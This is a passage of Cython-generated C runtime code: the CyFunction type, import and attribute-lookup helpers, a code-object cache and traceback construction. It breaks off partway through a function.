    {(char *) "__doc__",  (getter)__Pyx_CyFunction_get_doc, (setter)__Pyx_CyFunction_set_doc, 0, 0},
    {(char *) "func_name", (getter)__Pyx_CyFunction_get_name, (setter)__Pyx_CyFunction_set_name, 0, 0},
    {(char *) "__name__", (getter)__Pyx_CyFunction_get_name, (setter)__Pyx_CyFunction_set_name, 0, 0},
    {(char *) "__qualname__", (getter)__Pyx_CyFunction_get_qualname, (setter)__Pyx_CyFunction_set_qualname, 0, 0},
    {(char *) "__self__", (getter)__Pyx_CyFunction_get_self, 0, 0, 0},
    {(char *) "func_dict", (getter)__Pyx_CyFunction_get_dict, (setter)__Pyx_CyFunction_set_dict, 0, 0},
    {(char *) "__dict__", (getter)__Pyx_CyFunction_get_dict, (setter)__Pyx_CyFunction_set_dict, 0, 0},
    {(char *) "func_globals", (getter)__Pyx_CyFunction_get_globals, 0, 0, 0},
    {(char *) "__globals__", (getter)__Pyx_CyFunction_get_globals, 0, 0, 0},
    {(char *) "func_closure", (getter)__Pyx_CyFunction_get_closure, 0, 0, 0},
    {(char *) "__closure__", (getter)__Pyx_CyFunction_get_closure, 0, 0, 0},
    {(char *) "func_code", (getter)__Pyx_CyFunction_get_code, 0, 0, 0},
    {(char *) "__code__", (getter)__Pyx_CyFunction_get_code, 0, 0, 0},
    {(char *) "func_defaults", (getter)__Pyx_CyFunction_get_defaults, (setter)__Pyx_CyFunction_set_defaults, 0, 0},
    {(char *) "__defaults__", (getter)__Pyx_CyFunction_get_defaults, (setter)__Pyx_CyFunction_set_defaults, 0, 0},
    {(char *) "__kwdefaults__", (getter)__Pyx_CyFunction_get_kwdefaults, (setter)__Pyx_CyFunction_set_kwdefaults, 0, 0},
    {(char *) "__annotations__", (getter)__Pyx_CyFunction_get_annotations, (setter)__Pyx_CyFunction_set_annotations, 0, 0},
    {0, 0, 0, 0, 0}
};
static PyMemberDef __pyx_CyFunction_members[] = {
    {(char *) "__module__", T_OBJECT, offsetof(PyCFunctionObject, m_module), PY_WRITE_RESTRICTED, 0},
    {0, 0, 0,  0, 0}
};
static PyObject *
__Pyx_CyFunction_reduce(__pyx_CyFunctionObject *m, CYTHON_UNUSED PyObject *args)
{
#if PY_MAJOR_VERSION >= 3
    Py_INCREF(m->func_qualname);
    return m->func_qualname;
#else
    return PyString_FromString(m->func.m_ml->ml_name);
#endif
}
static PyMethodDef __pyx_CyFunction_methods[] = {
    {"__reduce__", (PyCFunction)__Pyx_CyFunction_reduce, METH_VARARGS, 0},
    {0, 0, 0, 0}
};
#if PY_VERSION_HEX < 0x030500A0
#define __Pyx_CyFunction_weakreflist(cyfunc) ((cyfunc)->func_weakreflist)
#else
#define __Pyx_CyFunction_weakreflist(cyfunc) ((cyfunc)->func.m_weakreflist)
#endif
static PyObject *__Pyx_CyFunction_Init(__pyx_CyFunctionObject *op, PyMethodDef *ml, int flags, PyObject* qualname,
                                       PyObject *closure, PyObject *module, PyObject* globals, PyObject* code) {
    if (unlikely(op == NULL))
        return NULL;
    op->flags = flags;
    __Pyx_CyFunction_weakreflist(op) = NULL;
    op->func.m_ml = ml;
    op->func.m_self = (PyObject *) op;
    Py_XINCREF(closure);
    op->func_closure = closure;
    Py_XINCREF(module);
    op->func.m_module = module;
    op->func_dict = NULL;
    op->func_name = NULL;
    Py_INCREF(qualname);
    op->func_qualname = qualname;
    op->func_doc = NULL;
    op->func_classobj = NULL;
    op->func_globals = globals;
    Py_INCREF(op->func_globals);
    Py_XINCREF(code);
    op->func_code = code;
    op->defaults_pyobjects = 0;
    op->defaults_size = 0;
    op->defaults = NULL;
    op->defaults_tuple = NULL;
    op->defaults_kwdict = NULL;
    op->defaults_getter = NULL;
    op->func_annotations = NULL;
    return (PyObject *) op;
}
static int
__Pyx_CyFunction_clear(__pyx_CyFunctionObject *m)
{
    Py_CLEAR(m->func_closure);
    Py_CLEAR(m->func.m_module);
    Py_CLEAR(m->func_dict);
    Py_CLEAR(m->func_name);
    Py_CLEAR(m->func_qualname);
    Py_CLEAR(m->func_doc);
    Py_CLEAR(m->func_globals);
    Py_CLEAR(m->func_code);
    Py_CLEAR(m->func_classobj);
    Py_CLEAR(m->defaults_tuple);
    Py_CLEAR(m->defaults_kwdict);
    Py_CLEAR(m->func_annotations);
    if (m->defaults) {
        PyObject **pydefaults = __Pyx_CyFunction_Defaults(PyObject *, m);
        int i;
        for (i = 0; i < m->defaults_pyobjects; i++)
            Py_XDECREF(pydefaults[i]);
        PyObject_Free(m->defaults);
        m->defaults = NULL;
    }
    return 0;
}
static void __Pyx__CyFunction_dealloc(__pyx_CyFunctionObject *m)
{
    if (__Pyx_CyFunction_weakreflist(m) != NULL)
        PyObject_ClearWeakRefs((PyObject *) m);
    __Pyx_CyFunction_clear(m);
    PyObject_GC_Del(m);
}
static void __Pyx_CyFunction_dealloc(__pyx_CyFunctionObject *m)
{
    PyObject_GC_UnTrack(m);
    __Pyx__CyFunction_dealloc(m);
}
static int __Pyx_CyFunction_traverse(__pyx_CyFunctionObject *m, visitproc visit, void *arg)
{
    Py_VISIT(m->func_closure);
    Py_VISIT(m->func.m_module);
    Py_VISIT(m->func_dict);
    Py_VISIT(m->func_name);
    Py_VISIT(m->func_qualname);
    Py_VISIT(m->func_doc);
    Py_VISIT(m->func_globals);
    Py_VISIT(m->func_code);
    Py_VISIT(m->func_classobj);
    Py_VISIT(m->defaults_tuple);
    Py_VISIT(m->defaults_kwdict);
    if (m->defaults) {
        PyObject **pydefaults = __Pyx_CyFunction_Defaults(PyObject *, m);
        int i;
        for (i = 0; i < m->defaults_pyobjects; i++)
            Py_VISIT(pydefaults[i]);
    }
    return 0;
}
static PyObject *__Pyx_CyFunction_descr_get(PyObject *func, PyObject *obj, PyObject *type)
{
#if PY_MAJOR_VERSION < 3
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    if (m->flags & __Pyx_CYFUNCTION_STATICMETHOD) {
        Py_INCREF(func);
        return func;
    }
    if (m->flags & __Pyx_CYFUNCTION_CLASSMETHOD) {
        if (type == NULL)
            type = (PyObject *)(Py_TYPE(obj));
        return __Pyx_PyMethod_New(func, type, (PyObject *)(Py_TYPE(type)));
    }
    if (obj == Py_None)
        obj = NULL;
#endif
    return __Pyx_PyMethod_New(func, obj, type);
}
static PyObject*
__Pyx_CyFunction_repr(__pyx_CyFunctionObject *op)
{
#if PY_MAJOR_VERSION >= 3
    return PyUnicode_FromFormat("<cyfunction %U at %p>",
                                op->func_qualname, (void *)op);
#else
    return PyString_FromFormat("<cyfunction %s at %p>",
                               PyString_AsString(op->func_qualname), (void *)op);
#endif
}
static PyObject * __Pyx_CyFunction_CallMethod(PyObject *func, PyObject *self, PyObject *arg, PyObject *kw) {
    PyCFunctionObject* f = (PyCFunctionObject*)func;
    PyCFunction meth = f->m_ml->ml_meth;
    Py_ssize_t size;
    switch (f->m_ml->ml_flags & (METH_VARARGS | METH_KEYWORDS | METH_NOARGS | METH_O)) {
    case METH_VARARGS:
        if (likely(kw == NULL || PyDict_Size(kw) == 0))
            return (*meth)(self, arg);
        break;
    case METH_VARARGS | METH_KEYWORDS:
        return (*(PyCFunctionWithKeywords)(void*)meth)(self, arg, kw);
    case METH_NOARGS:
        if (likely(kw == NULL || PyDict_Size(kw) == 0)) {
            size = PyTuple_GET_SIZE(arg);
            if (likely(size == 0))
                return (*meth)(self, NULL);
            PyErr_Format(PyExc_TypeError,
                "%.200s() takes no arguments (%" CYTHON_FORMAT_SSIZE_T "d given)",
                f->m_ml->ml_name, size);
            return NULL;
        }
        break;
    case METH_O:
        if (likely(kw == NULL || PyDict_Size(kw) == 0)) {
            size = PyTuple_GET_SIZE(arg);
            if (likely(size == 1)) {
                PyObject *result, *arg0;
                #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                arg0 = PyTuple_GET_ITEM(arg, 0);
                #else
                arg0 = PySequence_ITEM(arg, 0); if (unlikely(!arg0)) return NULL;
                #endif
                result = (*meth)(self, arg0);
                #if !(CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS)
                Py_DECREF(arg0);
                #endif
                return result;
            }
            PyErr_Format(PyExc_TypeError,
                "%.200s() takes exactly one argument (%" CYTHON_FORMAT_SSIZE_T "d given)",
                f->m_ml->ml_name, size);
            return NULL;
        }
        break;
    default:
        PyErr_SetString(PyExc_SystemError, "Bad call flags in "
                        "__Pyx_CyFunction_Call. METH_OLDARGS is no "
                        "longer supported!");
        return NULL;
    }
    PyErr_Format(PyExc_TypeError, "%.200s() takes no keyword arguments",
                 f->m_ml->ml_name);
    return NULL;
}
static CYTHON_INLINE PyObject *__Pyx_CyFunction_Call(PyObject *func, PyObject *arg, PyObject *kw) {
    return __Pyx_CyFunction_CallMethod(func, ((PyCFunctionObject*)func)->m_self, arg, kw);
}
static PyObject *__Pyx_CyFunction_CallAsMethod(PyObject *func, PyObject *args, PyObject *kw) {
    PyObject *result;
    __pyx_CyFunctionObject *cyfunc = (__pyx_CyFunctionObject *) func;
    if ((cyfunc->flags & __Pyx_CYFUNCTION_CCLASS) && !(cyfunc->flags & __Pyx_CYFUNCTION_STATICMETHOD)) {
        Py_ssize_t argc;
        PyObject *new_args;
        PyObject *self;
        argc = PyTuple_GET_SIZE(args);
        new_args = PyTuple_GetSlice(args, 1, argc);
        if (unlikely(!new_args))
            return NULL;
        self = PyTuple_GetItem(args, 0);
        if (unlikely(!self)) {
            Py_DECREF(new_args);
#if PY_MAJOR_VERSION > 2
            PyErr_Format(PyExc_TypeError,
                         "unbound method %.200S() needs an argument",
                         cyfunc->func_qualname);
#else
            PyErr_SetString(PyExc_TypeError,
                            "unbound method needs an argument");
#endif
            return NULL;
        }
        result = __Pyx_CyFunction_CallMethod(func, self, new_args, kw);
        Py_DECREF(new_args);
    } else {
        result = __Pyx_CyFunction_Call(func, args, kw);
    }
    return result;
}
static PyTypeObject __pyx_CyFunctionType_type = {
    PyVarObject_HEAD_INIT(0, 0)
    "cython_function_or_method",
    sizeof(__pyx_CyFunctionObject),
    0,
    (destructor) __Pyx_CyFunction_dealloc,
    0,
    0,
    0,
#if PY_MAJOR_VERSION < 3
    0,
#else
    0,
#endif
    (reprfunc) __Pyx_CyFunction_repr,
    0,
    0,
    0,
    0,
    __Pyx_CyFunction_CallAsMethod,
    0,
    0,
    0,
    0,
    Py_TPFLAGS_DEFAULT | Py_TPFLAGS_HAVE_GC,
    0,
    (traverseproc) __Pyx_CyFunction_traverse,
    (inquiry) __Pyx_CyFunction_clear,
    0,
#if PY_VERSION_HEX < 0x030500A0
    offsetof(__pyx_CyFunctionObject, func_weakreflist),
#else
    offsetof(PyCFunctionObject, m_weakreflist),
#endif
    0,
    0,
    __pyx_CyFunction_methods,
    __pyx_CyFunction_members,
    __pyx_CyFunction_getsets,
    0,
    0,
    __Pyx_CyFunction_descr_get,
    0,
    offsetof(__pyx_CyFunctionObject, func_dict),
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
#if PY_VERSION_HEX >= 0x030400a1
    0,
#endif
#if PY_VERSION_HEX >= 0x030800b1 && (!CYTHON_COMPILING_IN_PYPY || PYPY_VERSION_NUM >= 0x07030800)
    0,
#endif
#if PY_VERSION_HEX >= 0x030800b4 && PY_VERSION_HEX < 0x03090000
    0,
#endif
#if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX >= 0x03090000
    0,
#endif
};
static int __pyx_CyFunction_init(void) {
    __pyx_CyFunctionType = __Pyx_FetchCommonType(&__pyx_CyFunctionType_type);
    if (unlikely(__pyx_CyFunctionType == NULL)) {
        return -1;
    }
    return 0;
}
static CYTHON_INLINE void *__Pyx_CyFunction_InitDefaults(PyObject *func, size_t size, int pyobjects) {
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    m->defaults = PyObject_Malloc(size);
    if (unlikely(!m->defaults))
        return PyErr_NoMemory();
    memset(m->defaults, 0, size);
    m->defaults_pyobjects = pyobjects;
    m->defaults_size = size;
    return m->defaults;
}
static CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsTuple(PyObject *func, PyObject *tuple) {
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    m->defaults_tuple = tuple;
    Py_INCREF(tuple);
}
static CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsKwDict(PyObject *func, PyObject *dict) {
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    m->defaults_kwdict = dict;
    Py_INCREF(dict);
}
static CYTHON_INLINE void __Pyx_CyFunction_SetAnnotationsDict(PyObject *func, PyObject *dict) {
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    m->func_annotations = dict;
    Py_INCREF(dict);
}

/* CythonFunction */
static PyObject *__Pyx_CyFunction_New(PyMethodDef *ml, int flags, PyObject* qualname,
                                      PyObject *closure, PyObject *module, PyObject* globals, PyObject* code) {
    PyObject *op = __Pyx_CyFunction_Init(
        PyObject_GC_New(__pyx_CyFunctionObject, __pyx_CyFunctionType),
        ml, flags, qualname, closure, module, globals, code
    );
    if (likely(op)) {
        PyObject_GC_Track(op);
    }
    return op;
}

/* PyIntCompare */
static CYTHON_INLINE PyObject* __Pyx_PyInt_EqObjC(PyObject *op1, PyObject *op2, CYTHON_UNUSED long intval, CYTHON_UNUSED long inplace) {
    if (op1 == op2) {
        Py_RETURN_TRUE;
    }
    #if PY_MAJOR_VERSION < 3
    if (likely(PyInt_CheckExact(op1))) {
        const long b = intval;
        long a = PyInt_AS_LONG(op1);
        if (a == b) Py_RETURN_TRUE; else Py_RETURN_FALSE;
    }
    #endif
    #if CYTHON_USE_PYLONG_INTERNALS
    if (likely(PyLong_CheckExact(op1))) {
        int unequal;
        unsigned long uintval;
        Py_ssize_t size = Py_SIZE(op1);
        const digit* digits = ((PyLongObject*)op1)->ob_digit;
        if (intval == 0) {
            if (size == 0) Py_RETURN_TRUE; else Py_RETURN_FALSE;
        } else if (intval < 0) {
            if (size >= 0)
                Py_RETURN_FALSE;
            intval = -intval;
            size = -size;
        } else {
            if (size <= 0)
                Py_RETURN_FALSE;
        }
        uintval = (unsigned long) intval;
#if PyLong_SHIFT * 4 < SIZEOF_LONG*8
        if (uintval >> (PyLong_SHIFT * 4)) {
            unequal = (size != 5) || (digits[0] != (uintval & (unsigned long) PyLong_MASK))
                 | (digits[1] != ((uintval >> (1 * PyLong_SHIFT)) & (unsigned long) PyLong_MASK)) | (digits[2] != ((uintval >> (2 * PyLong_SHIFT)) & (unsigned long) PyLong_MASK)) | (digits[3] != ((uintval >> (3 * PyLong_SHIFT)) & (unsigned long) PyLong_MASK)) | (digits[4] != ((uintval >> (4 * PyLong_SHIFT)) & (unsigned long) PyLong_MASK));
        } else
#endif
#if PyLong_SHIFT * 3 < SIZEOF_LONG*8
        if (uintval >> (PyLong_SHIFT * 3)) {
            unequal = (size != 4) || (digits[0] != (uintval & (unsigned long) PyLong_MASK))
                 | (digits[1] != ((uintval >> (1 * PyLong_SHIFT)) & (unsigned long) PyLong_MASK)) | (digits[2] != ((uintval >> (2 * PyLong_SHIFT)) & (unsigned long) PyLong_MASK)) | (digits[3] != ((uintval >> (3 * PyLong_SHIFT)) & (unsigned long) PyLong_MASK));
        } else
#endif
#if PyLong_SHIFT * 2 < SIZEOF_LONG*8
        if (uintval >> (PyLong_SHIFT * 2)) {
            unequal = (size != 3) || (digits[0] != (uintval & (unsigned long) PyLong_MASK))
                 | (digits[1] != ((uintval >> (1 * PyLong_SHIFT)) & (unsigned long) PyLong_MASK)) | (digits[2] != ((uintval >> (2 * PyLong_SHIFT)) & (unsigned long) PyLong_MASK));
        } else
#endif
#if PyLong_SHIFT * 1 < SIZEOF_LONG*8
        if (uintval >> (PyLong_SHIFT * 1)) {
            unequal = (size != 2) || (digits[0] != (uintval & (unsigned long) PyLong_MASK))
                 | (digits[1] != ((uintval >> (1 * PyLong_SHIFT)) & (unsigned long) PyLong_MASK));
        } else
#endif
            unequal = (size != 1) || (((unsigned long) digits[0]) != (uintval & (unsigned long) PyLong_MASK));
        if (unequal == 0) Py_RETURN_TRUE; else Py_RETURN_FALSE;
    }
    #endif
    if (PyFloat_CheckExact(op1)) {
        const long b = intval;
        double a = PyFloat_AS_DOUBLE(op1);
        if ((double)a == (double)b) Py_RETURN_TRUE; else Py_RETURN_FALSE;
    }
    return (
        PyObject_RichCompare(op1, op2, Py_EQ));
}

/* None */
static CYTHON_INLINE void __Pyx_RaiseUnboundLocalError(const char *varname) {
    PyErr_Format(PyExc_UnboundLocalError, "local variable '%s' referenced before assignment", varname);
}

/* PyObject_GenericGetAttrNoDict */
#if CYTHON_USE_TYPE_SLOTS && CYTHON_USE_PYTYPE_LOOKUP && PY_VERSION_HEX < 0x03070000
static PyObject *__Pyx_RaiseGenericGetAttributeError(PyTypeObject *tp, PyObject *attr_name) {
    PyErr_Format(PyExc_AttributeError,
#if PY_MAJOR_VERSION >= 3
                 "'%.50s' object has no attribute '%U'",
                 tp->tp_name, attr_name);
#else
                 "'%.50s' object has no attribute '%.400s'",
                 tp->tp_name, PyString_AS_STRING(attr_name));
#endif
    return NULL;
}
static CYTHON_INLINE PyObject* __Pyx_PyObject_GenericGetAttrNoDict(PyObject* obj, PyObject* attr_name) {
    PyObject *descr;
    PyTypeObject *tp = Py_TYPE(obj);
    if (unlikely(!PyString_Check(attr_name))) {
        return PyObject_GenericGetAttr(obj, attr_name);
    }
    assert(!tp->tp_dictoffset);
    descr = _PyType_Lookup(tp, attr_name);
    if (unlikely(!descr)) {
        return __Pyx_RaiseGenericGetAttributeError(tp, attr_name);
    }
    Py_INCREF(descr);
    #if PY_MAJOR_VERSION < 3
    if (likely(PyType_HasFeature(Py_TYPE(descr), Py_TPFLAGS_HAVE_CLASS)))
    #endif
    {
        descrgetfunc f = Py_TYPE(descr)->tp_descr_get;
        if (unlikely(f)) {
            PyObject *res = f(descr, obj, (PyObject *)tp);
            Py_DECREF(descr);
            return res;
        }
    }
    return descr;
}
#endif

/* Import */
static PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level) {
    PyObject *empty_list = 0;
    PyObject *module = 0;
    PyObject *global_dict = 0;
    PyObject *empty_dict = 0;
    PyObject *list;
    #if PY_MAJOR_VERSION < 3
    PyObject *py_import;
    py_import = __Pyx_PyObject_GetAttrStr(__pyx_b, __pyx_n_s_import);
    if (!py_import)
        goto bad;
    #endif
    if (from_list)
        list = from_list;
    else {
        empty_list = PyList_New(0);
        if (!empty_list)
            goto bad;
        list = empty_list;
    }
    global_dict = PyModule_GetDict(__pyx_m);
    if (!global_dict)
        goto bad;
    empty_dict = PyDict_New();
    if (!empty_dict)
        goto bad;
    {
        #if PY_MAJOR_VERSION >= 3
        if (level == -1) {
            if ((1) && (strchr(__Pyx_MODULE_NAME, '.'))) {
                module = PyImport_ImportModuleLevelObject(
                    name, global_dict, empty_dict, list, 1);
                if (!module) {
                    if (!PyErr_ExceptionMatches(PyExc_ImportError))
                        goto bad;
                    PyErr_Clear();
                }
            }
            level = 0;
        }
        #endif
        if (!module) {
            #if PY_MAJOR_VERSION < 3
            PyObject *py_level = PyInt_FromLong(level);
            if (!py_level)
                goto bad;
            module = PyObject_CallFunctionObjArgs(py_import,
                name, global_dict, empty_dict, list, py_level, (PyObject *)NULL);
            Py_DECREF(py_level);
            #else
            module = PyImport_ImportModuleLevelObject(
                name, global_dict, empty_dict, list, level);
            #endif
        }
    }
bad:
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(py_import);
    #endif
    Py_XDECREF(empty_list);
    Py_XDECREF(empty_dict);
    return module;
}

/* ImportFrom */
static PyObject* __Pyx_ImportFrom(PyObject* module, PyObject* name) {
    PyObject* value = __Pyx_PyObject_GetAttrStr(module, name);
    if (unlikely(!value) && PyErr_ExceptionMatches(PyExc_AttributeError)) {
        PyErr_Format(PyExc_ImportError,
        #if PY_MAJOR_VERSION < 3
            "cannot import name %.230s", PyString_AS_STRING(name));
        #else
            "cannot import name %S", name);
        #endif
    }
    return value;
}

/* PyObjectGetMethod */
static int __Pyx_PyObject_GetMethod(PyObject *obj, PyObject *name, PyObject **method) {
    PyObject *attr;
#if CYTHON_UNPACK_METHODS && CYTHON_COMPILING_IN_CPYTHON && CYTHON_USE_PYTYPE_LOOKUP
    PyTypeObject *tp = Py_TYPE(obj);
    PyObject *descr;
    descrgetfunc f = NULL;
    PyObject **dictptr, *dict;
    int meth_found = 0;
    assert (*method == NULL);
    if (unlikely(tp->tp_getattro != PyObject_GenericGetAttr)) {
        attr = __Pyx_PyObject_GetAttrStr(obj, name);
        goto try_unpack;
    }
    if (unlikely(tp->tp_dict == NULL) && unlikely(PyType_Ready(tp) < 0)) {
        return 0;
    }
    descr = _PyType_Lookup(tp, name);
    if (likely(descr != NULL)) {
        Py_INCREF(descr);
#if PY_MAJOR_VERSION >= 3
        #ifdef __Pyx_CyFunction_USED
        if (likely(PyFunction_Check(descr) || (Py_TYPE(descr) == &PyMethodDescr_Type) || __Pyx_CyFunction_Check(descr)))
        #else
        if (likely(PyFunction_Check(descr) || (Py_TYPE(descr) == &PyMethodDescr_Type)))
        #endif
#else
        #ifdef __Pyx_CyFunction_USED
        if (likely(PyFunction_Check(descr) || __Pyx_CyFunction_Check(descr)))
        #else
        if (likely(PyFunction_Check(descr)))
        #endif
#endif
        {
            meth_found = 1;
        } else {
            f = Py_TYPE(descr)->tp_descr_get;
            if (f != NULL && PyDescr_IsData(descr)) {
                attr = f(descr, obj, (PyObject *)Py_TYPE(obj));
                Py_DECREF(descr);
                goto try_unpack;
            }
        }
    }
    dictptr = _PyObject_GetDictPtr(obj);
    if (dictptr != NULL && (dict = *dictptr) != NULL) {
        Py_INCREF(dict);
        attr = __Pyx_PyDict_GetItemStr(dict, name);
        if (attr != NULL) {
            Py_INCREF(attr);
            Py_DECREF(dict);
            Py_XDECREF(descr);
            goto try_unpack;
        }
        Py_DECREF(dict);
    }
    if (meth_found) {
        *method = descr;
        return 1;
    }
    if (f != NULL) {
        attr = f(descr, obj, (PyObject *)Py_TYPE(obj));
        Py_DECREF(descr);
        goto try_unpack;
    }
    if (descr != NULL) {
        *method = descr;
        return 0;
    }
    PyErr_Format(PyExc_AttributeError,
#if PY_MAJOR_VERSION >= 3
                 "'%.50s' object has no attribute '%U'",
                 tp->tp_name, name);
#else
                 "'%.50s' object has no attribute '%.400s'",
                 tp->tp_name, PyString_AS_STRING(name));
#endif
    return 0;
#else
    attr = __Pyx_PyObject_GetAttrStr(obj, name);
    goto try_unpack;
#endif
try_unpack:
#if CYTHON_UNPACK_METHODS
    if (likely(attr) && PyMethod_Check(attr) && likely(PyMethod_GET_SELF(attr) == obj)) {
        PyObject *function = PyMethod_GET_FUNCTION(attr);
        Py_INCREF(function);
        Py_DECREF(attr);
        *method = function;
        return 1;
    }
#endif
    *method = attr;
    return 0;
}

/* PyObjectCallMethod1 */
static PyObject* __Pyx__PyObject_CallMethod1(PyObject* method, PyObject* arg) {
    PyObject *result = __Pyx_PyObject_CallOneArg(method, arg);
    Py_DECREF(method);
    return result;
}
static PyObject* __Pyx_PyObject_CallMethod1(PyObject* obj, PyObject* method_name, PyObject* arg) {
    PyObject *method = NULL, *result;
    int is_method = __Pyx_PyObject_GetMethod(obj, method_name, &method);
    if (likely(is_method)) {
        result = __Pyx_PyObject_Call2Args(method, obj, arg);
        Py_DECREF(method);
        return result;
    }
    if (unlikely(!method)) return NULL;
    return __Pyx__PyObject_CallMethod1(method, arg);
}

/* append */
static CYTHON_INLINE int __Pyx_PyObject_Append(PyObject* L, PyObject* x) {
    if (likely(PyList_CheckExact(L))) {
        if (unlikely(__Pyx_PyList_Append(L, x) < 0)) return -1;
    } else {
        PyObject* retval = __Pyx_PyObject_CallMethod1(L, __pyx_n_s_append, x);
        if (unlikely(!retval))
            return -1;
        Py_DECREF(retval);
    }
    return 0;
}

/* CLineInTraceback */
#ifndef CYTHON_CLINE_IN_TRACEBACK
static int __Pyx_CLineForTraceback(CYTHON_UNUSED PyThreadState *tstate, int c_line) {
    PyObject *use_cline;
    PyObject *ptype, *pvalue, *ptraceback;
#if CYTHON_COMPILING_IN_CPYTHON
    PyObject **cython_runtime_dict;
#endif
    if (unlikely(!__pyx_cython_runtime)) {
        return c_line;
    }
    __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);
#if CYTHON_COMPILING_IN_CPYTHON
    cython_runtime_dict = _PyObject_GetDictPtr(__pyx_cython_runtime);
    if (likely(cython_runtime_dict)) {
        __PYX_PY_DICT_LOOKUP_IF_MODIFIED(
            use_cline, *cython_runtime_dict,
            __Pyx_PyDict_GetItemStr(*cython_runtime_dict, __pyx_n_s_cline_in_traceback))
    } else
#endif
    {
      PyObject *use_cline_obj = __Pyx_PyObject_GetAttrStr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback);
      if (use_cline_obj) {
        use_cline = PyObject_Not(use_cline_obj) ? Py_False : Py_True;
        Py_DECREF(use_cline_obj);
      } else {
        PyErr_Clear();
        use_cline = NULL;
      }
    }
    if (!use_cline) {
        c_line = 0;
        (void) PyObject_SetAttr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback, Py_False);
    }
    else if (use_cline == Py_False || (use_cline != Py_True && PyObject_Not(use_cline) != 0)) {
        c_line = 0;
    }
    __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);
    return c_line;
}
#endif

/* CodeObjectCache */
static int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line) {
    int start = 0, mid = 0, end = count - 1;
    if (end >= 0 && code_line > entries[end].code_line) {
        return count;
    }
    while (start < end) {
        mid = start + (end - start) / 2;
        if (code_line < entries[mid].code_line) {
            end = mid;
        } else if (code_line > entries[mid].code_line) {
             start = mid + 1;
        } else {
            return mid;
        }
    }
    if (code_line <= entries[mid].code_line) {
        return mid;
    } else {
        return mid + 1;
    }
}
static PyCodeObject *__pyx_find_code_object(int code_line) {
    PyCodeObject* code_object;
    int pos;
    if (unlikely(!code_line) || unlikely(!__pyx_code_cache.entries)) {
        return NULL;
    }
    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);
    if (unlikely(pos >= __pyx_code_cache.count) || unlikely(__pyx_code_cache.entries[pos].code_line != code_line)) {
        return NULL;
    }
    code_object = __pyx_code_cache.entries[pos].code_object;
    Py_INCREF(code_object);
    return code_object;
}
static void __pyx_insert_code_object(int code_line, PyCodeObject* code_object) {
    int pos, i;
    __Pyx_CodeObjectCacheEntry* entries = __pyx_code_cache.entries;
    if (unlikely(!code_line)) {
        return;
    }
    if (unlikely(!entries)) {
        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Malloc(64*sizeof(__Pyx_CodeObjectCacheEntry));
        if (likely(entries)) {
            __pyx_code_cache.entries = entries;
            __pyx_code_cache.max_count = 64;
            __pyx_code_cache.count = 1;
            entries[0].code_line = code_line;
            entries[0].code_object = code_object;
            Py_INCREF(code_object);
        }
        return;
    }
    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);
    if ((pos < __pyx_code_cache.count) && unlikely(__pyx_code_cache.entries[pos].code_line == code_line)) {
        PyCodeObject* tmp = entries[pos].code_object;
        entries[pos].code_object = code_object;
        Py_DECREF(tmp);
        return;
    }
    if (__pyx_code_cache.count == __pyx_code_cache.max_count) {
        int new_max = __pyx_code_cache.max_count + 64;
        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Realloc(
            __pyx_code_cache.entries, ((size_t)new_max) * sizeof(__Pyx_CodeObjectCacheEntry));
        if (unlikely(!entries)) {
            return;
        }
        __pyx_code_cache.entries = entries;
        __pyx_code_cache.max_count = new_max;
    }
    for (i=__pyx_code_cache.count; i>pos; i--) {
        entries[i] = entries[i-1];
    }
    entries[pos].code_line = code_line;
    entries[pos].code_object = code_object;
    __pyx_code_cache.count++;
    Py_INCREF(code_object);
}

/* AddTraceback */
#include "compile.h"
#include "frameobject.h"
#include "traceback.h"
#if PY_VERSION_HEX >= 0x030b00a6
  #ifndef Py_BUILD_CORE
    #define Py_BUILD_CORE 1
  #endif
  #include "internal/pycore_frame.h"
#endif
static PyCodeObject* __Pyx_CreateCodeObjectForTraceback(
            const char *funcname, int c_line,
            int py_line, const char *filename) {
    PyCodeObject *py_code = NULL;
    PyObject *py_funcname = NULL;
    #if PY_MAJOR_VERSION < 3
    PyObject *py_srcfile = NULL;
    py_srcfile = PyString_FromString(filename);
    if (!py_srcfile) goto bad;
    #endif
    if (c_line) {
        #if PY_MAJOR_VERSION < 3
        py_funcname = PyString_FromFormat( "%s (%s:%d)", funcname, __pyx_cfilenm, c_line);
        if (!py_funcname) goto bad;
        #else
        py_funcname = PyUnicode_FromFormat( "%s (%s:%d)", funcname, __pyx_cfilenm, c_line);
        if (!py_funcname) goto bad;
        funcname = PyUnicode_AsUTF8(py_funcname);
        if (!funcname) goto bad;
        #endif
    }
    else {
        #if PY_MAJOR_VERSION < 3
        py_funcname = PyString_FromString(funcname);
        if (!py_funcname) goto bad;
        #endif
    }
    #if PY_MAJOR_VERSION < 3
    py_code = __Pyx_PyCode_New(
        0,
        0,
        0,
        0,
        0,
        __pyx_empty_bytes, /*PyObject *code,*/
        __pyx_empty_tuple, /*PyObject *consts,*/
        __pyx_empty_tuple, /*PyObject *names,*/
        __pyx_empty_tuple, /*PyObject *varnames,*/
        __pyx_empty_tuple, /*PyObject *freevars,*/
        __pyx_empty_tuple, /*PyObject *cellvars,*/
        py_srcfile,   /*PyObject *filename,*/
        py_funcname,  /*PyObject *name,*/
        py_line,
        __pyx_empty_bytes  /*PyObject *lnotab*/
